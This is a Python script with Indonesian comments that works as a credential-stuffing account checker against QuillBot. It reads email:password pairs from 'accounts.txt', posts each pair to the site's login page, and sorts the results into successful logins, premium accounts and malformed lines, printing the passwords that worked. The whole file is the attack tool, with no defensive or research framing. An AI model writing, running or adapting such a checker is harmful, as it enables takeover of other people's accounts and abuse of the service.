import requests
from bs4 import BeautifulSoup

# Fungsi untuk cek login
def check_login(username, password):
    login_url = "https://quillbot.com/login"
    payload = {
        "email": username,
        "password": password
    }

    # Kirim permintaan POST untuk login
    response = requests.post(login_url, data=payload)

    # Parsing halaman web menggunakan BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Cek apakah berhasil login atau tidak berdasarkan elemen di halaman web
    if soup.find('div', {'class': 'error'}):
        return False, None
    else:
        # Ekstrak informasi akun
        summary = soup.find('div', {'class': 'account-summary'})
        return True, summary.text if summary else None

# Fungsi untuk cetak teks warna merah dan bold
def print_red_bold(text):
    RED_BOLD = "\033[1;31m"  # Kode ANSI untuk teks merah bold
    RESET = "\033[0m"  # Kode ANSI untuk reset warna dan gaya teks
    print(f"{RED_BOLD}{text}{RESET}")

# Variabel untuk menyimpan summary hasil
jumlah_akun = 0
tidak_premium = 0
premium = 0
salah_format = 0

# Baca file accounts.txt
with open('accounts.txt', 'r') as file:
    accounts = file.readlines()

# Loop untuk setiap akun
for index, account in enumerate(accounts, start=1):
    # Bersihkan whitespace dan pecah menjadi username dan password
    account_info = account.strip().split(':')
    
    # Pemeriksaan format
    if len(account_info) != 2:
        print(f"{index}. Format akun salah: {account.strip()}")
        salah_format += 1
        continue

    username, password = account_info
    jumlah_akun += 1
    
    # Cek login
    success, summary = check_login(username, password)
    
    print(f"{index}. Menggunakan akun: {username}")
    
    if success:
        print(f"   - Berhasil login dengan password: {password}")
        
        # Cek apakah akun premium
        if summary and "Premium" in summary:
            print(f"   - Akun {username} adalah akun premium")
            premium += 1
        else:
            print_red_bold(f"   - Akun {username} bukan akun premium")
            tidak_premium += 1
    else:
        print(f"   - Gagal login dengan password: {password}")

# Cetak summary hasil
print("\nSummary:")
print(f"Jumlah Akun: {jumlah_akun}")
print(f"Tidak Premium: {tidak_premium}")
print(f"Premium: {premium}")
print(f"Salah Format: {salah_format}")
